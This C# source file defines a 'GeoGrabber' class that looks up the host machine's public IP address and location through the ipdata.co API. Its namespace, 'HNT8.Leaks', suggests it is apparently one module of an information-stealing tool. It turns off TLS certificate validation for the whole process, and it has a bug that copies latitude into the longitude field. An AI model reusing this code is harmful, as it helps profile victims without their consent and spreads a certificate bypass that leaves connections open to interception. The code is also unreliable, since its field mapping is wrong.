using HNT8.Leaks.GeoLocation.Structures;
using Newtonsoft.Json.Linq;
using System.Net;

namespace HNT8.Leaks.GeoLocation
{
    public static class GeoGrabber
    {
        public static GeoInfo GetGeoInfo()
        {
            // Creates web client and converts json api to GeoInfo object

            WebClient client = new WebClient();
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            string json = client.DownloadString($"https://api.ipdata.co/?api-key={Configuration.IPDataKey}");
            var obj = JObject.Parse(json);

            return new GeoInfo
            {
                IPAddress = obj["ip"].ToString(),
                City = obj["city"].ToString(),
                Region = obj["region"].ToString(),
                RegionCode = obj["region_code"].ToString(),
                Country = obj["country_name"].ToString(),
                CountryCode = obj["country_code"].ToString(),
                Continent = obj["continent_name"].ToString(),
                ContinentCode = obj["continent_code"].ToString(),
                Latitude = obj["latitude"].ToString(),
                Longitude = obj["latitude"].ToString(),
                Postal = obj["postal"].ToString(),
                CountryEmoji = obj["flag"].ToString(),
            };
        }
    }
}
